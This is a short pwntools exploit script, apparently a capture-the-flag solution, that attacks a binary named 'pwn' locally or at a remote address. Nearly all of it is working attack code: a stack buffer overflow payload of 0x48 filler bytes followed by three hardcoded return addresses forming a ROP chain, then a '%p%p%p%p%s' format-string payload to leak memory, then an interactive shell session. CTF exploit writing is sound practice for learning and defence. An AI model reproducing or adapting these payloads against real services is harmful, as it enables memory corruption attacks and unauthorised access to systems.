#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
# set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

ru(b"Do you know where it could be?! \n")
sl(b"a" * 0x48 + p64(0x000000000040139D) + p64(0x401216) + p64(0x40131F))

ru(b"sooo... anyways whats your favorite Taylor Swift song? ")
sl(b"%p%p%p%p%s")

ia()
